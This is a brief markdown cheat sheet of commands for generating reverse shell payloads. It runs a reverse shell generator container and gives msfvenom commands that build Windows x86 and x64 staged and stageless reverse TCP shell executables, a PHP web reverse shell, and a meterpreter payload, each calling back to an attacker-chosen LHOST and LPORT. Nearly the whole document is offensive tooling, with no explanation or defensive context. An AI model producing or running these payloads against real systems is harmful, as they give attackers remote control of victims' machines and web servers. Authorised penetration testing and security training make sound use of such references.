## using Reverse Shell Generator

```
docker run -d -p 80:80 reverse_shell_generator
```

## using msfvenom (Metasploit)
### non meterpreter
Windows staged payloads
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```
Windows stageless payloads
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```
web payloads
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
###  meterpreter
Windows staged payloads
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```
